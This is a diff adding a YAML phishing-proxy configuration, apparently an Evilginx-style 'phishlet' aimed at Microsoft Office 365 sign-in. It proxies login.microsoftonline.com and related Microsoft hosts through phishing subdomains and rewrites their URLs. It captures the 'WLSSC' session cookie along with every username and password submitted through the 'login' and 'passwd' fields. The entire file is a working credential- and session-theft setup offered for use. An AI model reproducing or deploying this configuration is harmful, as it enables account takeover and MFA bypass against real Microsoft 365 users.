@@ -1,0 +1,39 @@
+name: 'o365'
+author: '@Jrodriguez556'
+min_ver: '2.0.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
+sub_filters:
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/common/', replace: 'https://{hostname}/common/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/common/oauth2/', replace: 'https://{hostname}/common/oauth2/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}/common/oauth2/authorize', replace: 'href="https://{hostname}/common/oauth2/authorize', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'account', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'account.microsoftonline.com', sub: 'account', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'account.microsoftonline.com', sub: 'live', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'account.microsoftonline.com', sub: 'account', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'www.office.com', sub: 'www', domain: 'office.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'www.office.com', sub: 'www', domain: 'office.com', search: '{hostname}/prefetch/prefetch', replace: '{hostname}/prefetch/prefetch', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/common/instrumentation/reportpageload?mkt=en-US', replace: 'https://{hostname}/common/instrumentation/reportpageload?mkt=en-US', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'outlook.office365.com', sub: 'outlook', domain: 'office365.com', search: 'https://{hostname}/owa/prefetch.aspx', replace: 'https://{hostname}/owa/prefetch.aspx', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'admin.onedrive.com', sub: 'admin', domain: 'onedrive.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'browser.pipe.aria.microsoft.com', sub: 'browser.pip.aria', domain: 'microsoft.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'browser.pipe.aria.microsoft.com', sub: 'browser.pip.aria', domain: 'microsoft.com', search: 'https://{hostname}/Collector/3.0/', replace: 'https://{hostname}/Collector/3.0/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/common/GetCredentialType?mkt=en-US', replace: 'https://{hostname}/common/GetCredentialType?mkt=en-US', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/common/oauth2/authorize', replace: 'https://{hostname}/common/oauth2/authorize', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: 'microsoftonline.com'
+    keys: ['WLSSC']
+user_regex:
+  key: 'login'
+  re: '(.*)'
+pass_regex:
+  key: 'passwd'
+  re: '(.*)'
+landing_path:
+  - '/common/oauth2/authorize?client_id=00000006-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dRMwoo4EFah-1dcMWNFUjhypbsOPo_OXi9YewhLcr8VRjwRXf5kW_wglRTTBGB60hfZyK5CjecVsEBSvfFuEzi0uNjjU-KEz_PoMp5OqDwEdU3m_HnlI9jtAGLbvs5dNtXkhV7bk0aLD7CmVZr0S-9NXyhq7NGeecCQ0gZ0ruLZ8&nonce=636716831389849970.OGFkNjRkYWYtYTFmMi00Mjg0LTg5MjUtZTU0MGY4YjA2YmY5ZWVkNDAzNDMtYjgzZC00OWE4LThjZGEtMWY4NzIxNmQ3OTNi&redirect_uri=https%3a%2f%2fportal.office.com%2flanding&ui_locales=en-US&mkt=en-US&client-request-id=0bf67fb5-3fdb-483a-ab6d-7c2ad03dd4df'
